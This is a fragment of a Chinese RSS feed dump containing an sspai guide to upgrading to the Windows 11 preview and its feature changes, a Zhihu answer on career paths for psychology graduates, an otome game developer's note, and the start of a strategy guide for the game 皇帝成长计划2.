Insider 的所有配置要求。</p>\n<h3>加入 Windows 预览体验计划</h3>\n<p>扫清硬件障碍后，请打开「设置」，依次进入「更新和安全」-「Windows 预览体验计划」，按提示加入「Dev 渠道」，再次检查更新，即可无缝升级至 Windows 11。成功上车后，在其它渠道开放前无法切换测试组，全新安装才能降级到稳定版本，请务必留心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/af1577f1c1c9a02733295b4d39fa3e1f\"></figure><p>即使你的设备不满足 Windows 11 的全部硬件要求，也可以通过 Windows 预览体验计划暂时绕过限制。微软表示，6 月 24 日前加入 Dev 渠道的先行者们甚至可无视 TPM，继续收到更新推送。这一部分用户反馈的问题会被标记为「在不兼容设备上运行」，提交的 bug 可能不会被修复。</p>\n<p>据微软说辞，Windows 11 正式发布后，不符合条件的设备会被踢出 Windows 预览体验计划，必须重新降级至 Windows 10——考虑到微软的作风，我对这条政策的实际执行力度持保留看法。但保不准微软这次就巨硬了，届时还想升级的话，手动安装镜像文件是个好方法。</p>\n<h3>通过 ISO 镜像手动升级</h3>\n<p>跨越版本号的重大系统更新，最稳妥的方法还是通过 ISO 镜像文件手动安装。由于微软尚未释出 Windows 11 的官方镜像文件，在本文发布的时间点，少数派不建议采用此方式升级，并提醒大家注意网络镜像版本与来源，避免个人数据丢失等意外情况出现。</p>\n<p>你可以在 <a href=\"https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewiso\">这里</a> 检查官方 Windows 预览版本镜像，出现 Windows 11 选项后根据个人需求下载，选择保留数据或全新安装。</p>\n<h2>有什么新功能</h2>\n<h3>首个预览版简单体验</h3>\n<p>在此之前，我们已经 <a href=\"https://sspai.com/post/67328\">上手</a> 过 Window 11 早期泄露版本，见到了新的配置向导、任务栏、开始菜单、操作中心和图标。但是在正式上手 Window 11 第一个测试版本（Build 22000.51）以后还是被细节惊艳到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/afc627933fe29eca74c58f32eb259eac\"><figcaption>左：云母石，右：亚克力</figcaption></figure><p>首先是更现代更好看的设置界面，除了新图标，设置背景还采用了 <a href=\"https://docs.microsoft.com/zh-tw/windows/apps/design/signature-experiences/materials\">云母石</a> 的材质，把原本单调的背景变得更加生动。而且相比于旧版空旷的设置界面，新的设置界面信息密度明显更高；还有常驻于侧边栏的一级设置，方便用户快速回到上级菜单或是跳转到其他设置中。最后，新的设置对可以点击的地方做了箭头指示，相比旧版更加清晰明了。当然控制面板目前还在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/f6a1dedb99a7a786a8aae598cac6a325\"><figcaption>个性化设置</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/904a3ee9eeae4e88192e1da92998bc69\"><figcaption>新版资源管理器</figcaption></figure><p>接下来就是日常中用得多的文件管理器也焕然一新，不仅把老旧的 Ribbon 组件给全部砍掉了，还用上了云母石材质和新的图标设计，显得更加简约简约现代。此外，系统级右键菜单也得到了改进全新的设计，变得更加直观明了；当然目前新右键菜单的功能并不算完善，如果想要访问旧版菜单可以使用新版菜单下的「显示更多选项」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/9bfc9bc256654647cc257ef37e350c7b\"><figcaption>新版右键菜单</figcaption></figure><p>再者就是一些细节上的更新了，比方说通知中心、日期时间面板、快捷操作面板和输入法的重构，让整体可读性和易用性变得更好了。系统默认的终端也变成了更现代的 Windows Terminal；AutoHDR 也对部分游戏启用了，打开支持的游戏时会有启用通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3881c8735468a57e1e7d889053deaec5\"><figcaption>通知中心和日期、时间面板</figcaption></figure><p>最后，Windows 11 中的音效也有不小的改进，总得来说就是更加悦耳了，大家可以去网上找找有关视频。</p>\n<h3>这些旧功能被砍掉了</h3>\n<p>Windows 11 砍掉了不少来自 Window 10 的特性，下面我们一起来梳理下这些被砍掉的「新」功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/08e71f6c5e6925c41c4f6051f3a017ff\"></figure><p>首先是，Windows 10 刚推出时被赋予重任的语音助手 Cortana 终于不预装在系统里了，不仅是首次配置向导中不会被突如其来的语音吓到，任务栏上也不会出现用不到的图标了。喜欢 Cortana 的小伙伴依然即可从 Windows 11 的应用商店下载到它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0861434c9b84d1fa3d171b941f149208\"></figure><p>其次，IE 在 Windows 11 中正式被禁用，这意味着长达 25 年的浏览器正式下岗了。微软建议由 IE 使用需求的用户用 Microsoft Edge 的 IE 模式替代。不过话又说回来，目前不少政府的系统已经面向 Chrome 类浏览器开发了，大部分使用 IE 的场景都是为了用网银系统，希望国内的银行可以赶紧跟进。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/2685ed97d9e2730162f66491fc0ca021\"></figure><p>图源：<a href=\"https://sspai.com/post/43818\">时间线、新 UI、字体商店……Windows 10 春季创意者有这些新功能</a></p>\n<p>再者 Windows 10 的时间轴功能也被砍了。时间线是 18 年 4 月份引入的功能，它能帮你记录你在什么时间在电脑上做了什么，方便你回溯操作。然而实际体验真的差到不行，操作界面不仅卡顿，而且大部分软件还不支持时间线的功能，甚至是第一方应用窗口截图都是空白的。现在在 Windows 11 里这个功能被彻底砍掉了。</p>\n<p>最后由于 Windows 11 采用了新的开始菜单和任务栏，所以不少我们熟知的功能也都不见了，比如：动态磁贴、可对开始菜单调整大小、应用程序组等，而且任务栏目前也只能固定在屏幕底部，21H1 中加入的新闻与兴趣也被重新集成到小部件里了；此外平板模式也从 Windows 11 里移除了，新功能将体现在键盘的连接和分离状态中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/dfacf73523add49c89a2352132acd82a.gif\"><figcaption>键盘分离、连接状态下任务栏的变化</figcaption></figure><p>其他被砍掉的功能可以看 <a href=\"https://www.microsoft.com/zh-cn/windows/windows-11-specifications#primaryR4\">这里</a>。总的来说 Windows 11 砍掉了不少 Windows 10 的特性，但是更早以前系统的组件却还保留着，让人不禁怀疑 Windows 11 是不是到头来什么都没有更新。</p>\n<h2>小结</h2>\n<p>如果你在更新后遇到了部分应用内文字乱码、游戏无法启动等问题，不妨检查一下「时间 &amp; 语言 &gt; 语言 &amp; 区域」设置中的「管理语言设置」选项，确保其中「非 Unicode 程序的语言」为 <code>中文(简体, 中国)</code>。这个操作对部分应用和游戏有效（比如《英雄联盟》）但不保证能够解决所有问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0bb29cb21352292d59f2dc276a1529bd\"></figure><p>除此之外，目前 Windows 11 Dev 频道的预览体验版本还有着诸多其他问题，如多账户用户在升级后无法启动设置界面、搜索界面偶尔无法正常加载图标等等。你可以在微软官方 <a href=\"https://blogs.windows.com/windows-insider/2021/06/28/announcing-the-first-insider-preview-for-windows-11/\" target=\"_blank\">博客</a> 的末尾查看这些问题，再决定是否升级。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67413\" target=\"_blank\">Windows 11 要更新了，这些变化能让你心动吗？</a></li>\n<li><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 泄露版上手体验</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，探索更有趣的数字生活 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67498"},{"title":"2021 年高考生想选心理学专业，好找工作吗？工资多少？就业方向和就业前景怎么样？","date":"2021-07-01 05:30:09","description":"\n<p>学心理学的人，毕业之后能做什么工作？</p>\n<p>都去做心理咨询师么？当然不是。</p>\n<p>继续做科研？可以呀，但也当然不是唯一的选择。</p>\n<p>《心理学职业发展手册》，由北京师范大学心理学部社会实践队出品，自2015年起，深度访谈在社会各领域心理学人，讲述生涯故事，希望全方位介绍心理学专业毕业生在毕业后可选择的职业方向与行业情况。</p>\n<p>学堂君在这个回答下面重新发布一下手册的完整目录，供心理学生或即将就读于心理学专业的同学翻阅了解。</p>\n<h2><b>高校教师</b></h2>\n<p><img src=\"https://pic1.zhimg.com/v2-e7b375120927ff15a8a017a4d21206b5_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1527\" data-watermark=\"original\" data-original-src=\"v2-e7b375120927ff15a8a017a4d21206b5\" data-watermark-src=\"v2-10f11376ddf7be462a776ab28e265b43\" data-private-watermark-src=\"v2-469493b9cf8cc20001135e010463122f\"></p>\n<p>在我国高校中，高校教师一般分为教学科研、工程实验员和行政管理等几类岗位。本节聚焦于承担教学科研任务的高校教师。</p>\n<p>有别于在研究院所中开展研究的科研工作者，高校教师一般需要承担科研和教学两方面的任务，发展过程中，还可能兼任系主任、副院长、院长等行政工作。除本专业外，心理学背景的科研工作者还广泛活跃于教育学、教育技术、行为经济学、人力资源管理、公共管理等院系部所。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fLpSoSt49LVt1G1v6JXUhg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">当学心理的人留在高校成为教师 | 心理学职业发展手册</a> </p>\n<h2>用户体验</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-2ca7b433867b7e6821e5248e0765a4cc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-2ca7b433867b7e6821e5248e0765a4cc\" data-watermark-src=\"v2-39838cccaf4380249da2df543ad9573b\" data-private-watermark-src=\"v2-0cb4fde68f03c5f40ba65bed13946c5f\"></p>\n<p>用户体验是用户在使用产品的过程中感受的总和，通俗来讲就是“这个东西好不好用、方不方便”。用户体验行业旨在为用户解决基本功能问题，提升产品的使用感受，满足用户的情感诉求。用户体验针对的产品不局限在实物，也包括虚拟产品，比如手机应用、服务等等。目前，各种各样的行业都已经逐渐意识到了提升用户体验对于产品开发与推广的重要性，并在公司内设立相关的部门。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/8wVu3X_5JU-JWUquaEEGGg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">学心理的人“让产品更好用” | 心理学职业发展手册</a> </p>\n<h2>市场研究</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-726bc306302a8d10543d2a8c4532f0d4_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-726bc306302a8d10543d2a8c4532f0d4\" data-watermark-src=\"v2-33eb3aad44f733d8e3031beabe84455d\" data-private-watermark-src=\"v2-c5b734db735f868793eaf51f2043cdf3\"></p>\n<p>市场研究公司是专业从事市场研究、市场调查、营销研究、满意度调查的专业公司。根据全球市场研究者协会的定义，市场研究公司接受其他组织的委托，为委托方需要进行的决策收集信息并进行专业性的研究活动。包括设计收集信息的方法、收集并管理数据、分析数据、得出相关结论等等。和战略咨询公司相比，市场研究公司偏重于科学、有效地收集中立的市场信息并作出分析，一般不对组织决策作出规划和指引，但可提出建议。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zR2P63BHrVOwQpPi_sPS_Q\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人如何研究市场 | 心理学职业发展手册</a> </p>\n<h2>考试研究</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-0b121ba889b679b8008e4f8f5c08b607_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-0b121ba889b679b8008e4f8f5c08b607\" data-watermark-src=\"v2-498828c94bca70138cebf2fa874455c3\" data-private-watermark-src=\"v2-67e718461e57e94c0203d0dcb62555be\"></p>\n<p>对人才的选拔是心理测量学中一个重要的研究方向。在中国，有许多人才选拔是由国家的各大考试院或考试中心来统一组织的，包括高考、公务员考试、医学资格考试等等。在这些考试院或考试中心中，有大量的心理学人负责为大型统一考试命题，收集考试数据进行收集、分析，甚至为教育考试改革提供意见与建议。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/C7-RFf8GYzA9QqBttNs2Ag\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理学人能在考试中做什么 | 心理学职业发展手册</a> </p>\n<h2>心理咨询</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-e6acf9775827fc921f1d2a8378a42873_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"762\" data-rawheight=\"1082\" data-watermark=\"original\" data-original-src=\"v2-e6acf9775827fc921f1d2a8378a42873\" data-watermark-src=\"v2-22852cfa3329d02491c5d9e79bc94920\" data-private-watermark-src=\"v2-d71f4e3fb0cfbd3cd2729ade8d11daa8\"></p>\n<p>心理咨询是指用一些专业的流派方法，通过语言交流或者一些互动活动来帮助来访者解决一些心理上的阻碍、促进来访者的交流沟通的一种专业帮助形式。许多大型公立的组织机构设立了心理咨询师的职位，如学校、残联、养老院等等，为组织内部的成员提供心理健康服务，解决相关心理问题（见高校心理咨询中心一章）。</p>\n<p>在在本章中，我们主要介绍在私立营利的心理咨询机构中工作的职业心理咨询师的工作。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/O58Yc9kdo_OSBN0GHsvFGQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">成就感与压力并存的助人者——心理咨询师 | 心理学职业发展手册</a> </p>\n<h2>高校心理咨询</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-ce51cc709bb8a90e4b73069a153c10a8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-ce51cc709bb8a90e4b73069a153c10a8\" data-watermark-src=\"v2-8e7bfba999b2e9a6c4a5b41ebef94fc0\" data-private-watermark-src=\"v2-669cb11a8aee20e6a642f8ff19147d34\"></p>\n<p>近年来，由于国家对大学生心理健康工作的重视和支持，大部分高校都设立了心理咨询中心，负责开展面对在校学生的心理咨询和心理健康教育。同时，根据不同高校对心理健康重视程度的不同，以及心理咨询中心行政从属关系的不同，咨询师往往还需要同时进行其他相关工作，如开展培训、讲座、心理健康活动等等。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Ri_cfG5T2LZqmoxL5KVHMw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">高校心理咨询师篇 | 心理学职业发展手册</a> </p>\n<h2>生涯规划师</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-0101c6d2e28f4bd9f1b35f6964a2c8ba_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"754\" data-rawheight=\"1068\" data-watermark=\"original\" data-original-src=\"v2-0101c6d2e28f4bd9f1b35f6964a2c8ba\" data-watermark-src=\"v2-e7ca85442ed7927d196cd3f770878fb0\" data-private-watermark-src=\"v2-4f6ce481f4bbf85f4c5db5273580eae0\"></p>\n<p>生涯规划师是针对个人的具体情况，通过测试、咨询、诊断、规划等方式，运用科学的测评工具，引导来访者客观地认识自己，调适自己的职业状态，制定合理的职业发展规划的专业人士。大多数生涯规划师供职于生涯规划公司，根据工作内容，又细分为咨询师和培训师。前者更多接受来访者一对一的咨询，而后者通过网络课程、现场讲座等方式向参与者提供生涯规划技巧。</p>\n<p>在生涯规划公司中，除了直接为客户提供职业咨询服务的咨询师和培训师，还有大量的支持性部门。如负责开发相关测验的测评部门、负责营销推广的市场部门等等。这些部门无疑也需要大量的心理学专业人才，但因为他们的工作内容和节奏与市场研究、考试研究行业中的研究型岗位都有相似之处，所以在本章中不再做详细介绍，而只聚焦于规划师的工作内容。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/hPvxGGX-OEb0BtFbErb9Wg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">生涯规划师篇 | 心理学职业发展手册</a> </p>\n<h2>心理学传播</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-8cb6767bc7d7bb9427dc4e1087b99d1c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-8cb6767bc7d7bb9427dc4e1087b99d1c\" data-watermark-src=\"v2-20dcc4962260f142ac44e12ad24d2230\" data-private-watermark-src=\"v2-5d5c521bbd3c522294ea92d54b0cbb79\"></p>\n<p>随着社会大众对心理健康的日益重视，普及与传播心理学知识、帮助人们了解自身和他人成为了心理学人的重要使命之一。除传统出版行业外，包括微信公众号、短视频、知乎等在内的多种形式的心理学传播机构也应运而生，从而创造出了大量需要心理学专业人才的岗位。</p>\n<p>由于心理学传播的形式多种多样，工作职责也各不相同，在本章中，我们将主要介绍传统纸质出版编辑和心理学科普公众号编辑两种差距较大、且较具代表性的工作岗位。同为心理学传播行业，传统出版行业的编辑工作更加稳定、专业和严谨；而公众号编辑的工作则更需要创造力、感知和追逐热点的能力。总之，这些形式和内容各异的岗位，为有志于心理学传播的心理学专业学生提供了多元的选择。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/XqyOfhICOeWW722N46s9Dg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">在出版界和新媒体发声的心理人 | 心理学职业发展手册</a> </p>\n<h2>中小学心理老师</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-4409e6d946296a692a02ff253fbc7627_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-4409e6d946296a692a02ff253fbc7627\" data-watermark-src=\"v2-a29745b681767a426376ad79b00abb10\" data-private-watermark-src=\"v2-0ff7e7c9545dc4674de24d669b86e08c\"></p>\n<p>中小学校心理老师是对所在学校进行心理健康教育建设工作，通过课程、咨询等手段改善师生心理健康状况，以达到促进学生健康成长、改善老师工作环境等目的的职业。目前，越来越多的中小学校开始重视心理健康教育。大部分中小学校也都配备了专职的心理教师。</p>\n<p>相较于在高校心理咨询中心工作的心理老师，中小学校的心理老师与全体学生的联系更加紧密，面对的学生群体的年龄、主要心理困惑也不太相同。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/UKErgp5dP0yhKYKus3g1MA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人在中小学当老师 | 心理学职业发展手册</a> </p>\n<h2>人力资源</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-261b8008e0e00970f41f7542d71ac5ab_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-261b8008e0e00970f41f7542d71ac5ab\" data-watermark-src=\"v2-c561298a3865f8549275ee9adf15778f\" data-private-watermark-src=\"v2-308e30df3940e195cf823285f155bd34\"></p>\n<p>人力资源部门（Human Resource，后文简称为HR部门）作为企业重要的支持性部门，负责对员工的薪酬、绩效、技能培养等进行管理。无论是哪一行业、哪一类型的企业，都会设立HR部门；同时，人力资源部门的工作内容和部门地位也受到企业本身较大程度的影响。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/C1LRRCV9b0ZdmIWmNLts6A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人如何跟“人力”打交道 | 心理学职业发展手册</a></p>\n<h2>管理咨询</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-cd4d425510c53b34281d33364e188b44_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-cd4d425510c53b34281d33364e188b44\" data-watermark-src=\"v2-b01012cbd64ae9892297589e0a03f82a\" data-private-watermark-src=\"v2-254d88e02409833f8c00b1ff512d2374\"></p>\n<p>管理咨询是由专家找出企业经营战略和经营管理上存在的问题，分析原因，提出改进方案的过程。而管理咨询顾问就如同企业的“医生”，负责为提出委托的企业提供诊断和治疗方案。</p>\n<p>目前，管理咨询分为战略咨询和人力资源咨询两大种。战略咨询偏向企业的经营与发展，与经济学、市场营销等关系较大；而人力资源咨询主要解决企业在人力资源管理过程中存在的问题，为企业提供员工招聘、绩效考核方案设计、薪酬体系规划、公司文化建立、员工培训等服务，是心理学人较多进入的行业。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/oQM-ZBV80iW8_cr2F-gLyQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人在企业当“医生” | 心理学职业发展手册</a> </p>\n<h2><b>心理学人还会去哪儿</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-a75da85ec00f2fc4c8c73e33ea5c2dc1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2043\" data-watermark=\"original\" data-original-src=\"v2-a75da85ec00f2fc4c8c73e33ea5c2dc1\" data-watermark-src=\"v2-5b0e53d15b508c138efe18efa644d88a\" data-private-watermark-src=\"v2-1045cc8fb4116f40ca4bf8911a765392\"></p>\n<p>心理学作为与人和社会有关的学科，与各种职业、各种工作都有一定的联系。心理学人的职业生涯选择也因此而变得格外多元。各行各业中都遍布心理学人的身影。那么，除了前十一章中所谈到的行业外，其他的心理学人都在哪里工作呢？</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/V9m9Nk1CUEkq9xoXp5J4uA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理学人还会去哪儿 | 心理学职业发展手册</a> </p>\n<p><br></p>\n<p><br></p>\n<p>作者：心理学生涯人物访谈实践队</p>\n<p>相关原文：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/czMDSl8rco4lGsxVchVTSw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">这本手册告诉你心理人在做什么工作 | 2018年终福利</a></p>\n<p>欢迎关注心理学科普平台<a href=\"https://www.zhihu.com/people/f3260f05df264ee916da258e1384e247\" class=\"internal\">@京师心理大学堂</a>，北京师范大学心理学部出品，奉献百年积淀，带你脑洞大开。任何形式的转载请知乎私信联系。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jing-shi-xin-li-da-xue-tang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">京师心理大学堂</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/459989284/answer/1971264035?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">25 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/328706095?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">对于2019 入学的准大学生来说，哪些专业就业前景「亮红灯」，需要加以警惕？</a><br><a href=\"http://www.zhihu.com/question/459989326?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021 年高考生想选能源动力专业，好找工作吗？工资多少？就业方向和就业前景怎么样？</a><br>\n","link":"http://www.zhihu.com/question/459989284/answer/1971264035?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价单机乙女向游戏《风起长安：驭骨人》？","date":"2021-06-30 11:30:10","description":"\n<p>大家好，我是《风起长安·驭骨人》的制作人非离，同时也担任了剧本写作和演出设计的工作。</p>\n<p>很高兴能在知乎上与大家聊聊我们新上线的这款乙女向单机游戏。</p>\n<p>这一作的诞生原因很多，但总归来说，是我们有故事希望能讲给大家听。</p>\n<p>作为一个因共同兴趣聚拢在一起的制作组，我们面临的问题很多，如大家所说……主要是资金问题。等到资金问题稍有缓解时，《风起长安·驭骨人》已经封包小半年了，这一点现在想来也很遗憾。</p>\n<p>游戏发售后，我看到最多的反馈是世界观很大，但剧本太短，很多问题没讲清楚。</p>\n<p>之前我有说过，《风起长安·驭骨人》是我们的心血之作，也必定成为遗憾之作。</p>\n<p>为了游戏能较完整地出现在大家面前，我将女主设置为非漩涡中心的人物，省去了大篇幅的权力斗争剧情，能更专注于感情线。</p>\n<p>同时我注意到许多玩家表达了对本作中其他女性角色的喜欢，我非常开心。除去男女主的情感描写，塑造女角色之间的友谊是我非常珍视的部分。</p>\n<p>制作时，我对剧情进行了优先级划分，最终将有限的资金分配到制作较为重要的主线剧情上，忍痛舍弃了部分支线剧情，包括其他角色剧情、回忆剧情等。</p>\n<p>这么做的益处很多：我能将剧情演出做得更为精致、细腻，做到了多CG、全语音配置，能一遍遍去磨演出设计、反复测试那0.5秒与1秒的视觉差别。</p>\n<p>缺点也很明显——世界观没铺开，给玩家留下了不少疑问。</p>\n<p>但好在《风起长安》初步构建了一个驭骨人的世界，后续我们会在同一世界观下继续制作新游戏。</p>\n<p>能走到今天，非常感谢玩家们的包容，能够包容我们的缺点、对我们进行鼓励。</p>\n<p>在此还要感谢发行商咕咕工作室，在我们最困难、几乎无以为继的时候提供了很多支持，《风起长安》能顺利做完，离不开咕咕小姐姐们的全力支援。</p>\n<p>目前我们已经在规划新作，非常感谢玩家对轻梨工作室的支持，我们会继续坚持下去。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/qing-li-gong-zuo-shi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">轻梨工作室</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/413716759?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为何手游《江南百景图》没有常州府？</a><br><a href=\"http://www.zhihu.com/question/266297957?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">网易游戏为什么大多是和风游戏（手游）？</a><br>\n","link":"http://www.zhihu.com/question/464467926/answer/1968625798?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"游戏《皇帝成长计划2》攻略有哪些？","date":"2021-06-29 15:30:07","description":"\n<p></p>\n<hr>\n<p>好兄弟们，我大一了，来更新了</p>\n<p>对本篇内容进行了更新与修改</p>\n<p>我创立了一个公众号叫【羊村大战魔仙堡】</p>\n<p>我这里面分类了一下攻略 希望更能清楚明了的帮到大家</p>\n<p>现在内容还比较少 但是在陆续更新 欢迎大家关注</p>\n<p>没有关注也没关系，会在知乎更新的哟</p>\n<hr>\n<p>这个游戏从小学大概4年级就开始玩了               现在高三了                                                              出来手游版                                                               越来越好啦                                                                                                                           </p>\n<p>有人看就再总结一下我玩的经验(个人总结，可能不够准确)：</p>\n<p><b>最最最重要的一点：一定要养成存档的好习惯!玩稍微久一点就黑屏，就什么都没有了!!!</b></p>\n<p>目前没有苹果手机的版本 但是苹果端玩家可以浏览器搜索皇帝成长计划2h5 点进4399在线玩(好消息，苹果端在2020.10.10上线啦！)</p>\n<p>1.前期最好不要过多招兵买马，容易破产</p>\n<p>2.前期多多贸易，能够让你不用克制去嚯嚯钱(推荐存档后再开始第二月，尽量刷成盈利)</p>\n<p>3.没钱可以尝试去东厂——查看把柄——东厂查办犯事官员——依法处理 可能抄家收获不菲</p>\n<p>4.智能建设才是根本上增加国库的！！！每天请坚持！！！</p>\n<p>5.<b>刷属性</b>：前期我一般都郊外先刷体能 然后尽量智慧多刷武力少刷 一般后期后期我都会让体能 智慧 武力 道德都700以上(为了教育皇子)</p>\n<p>6.<b>刷近臣</b>推荐的性格是：聪明 理想 独立(送礼多)</p>\n<p>7.我觉得<b>御医楼</b>的最高位置最好刷到4(能够省时间：一般+35 特殊全满 )</p>\n<p>8.培养皇子的话，最好不要太快立为太子，先派遣历练，如果已经立了的话，也可以通过送珍宝加属性(和大臣一样)</p>\n<p>9.皇子派遣历练：尽量选<b>出任幕僚</b>吧 加的属性一般多一点(不要忘记去宗人府或者养心殿给他们奖赏) 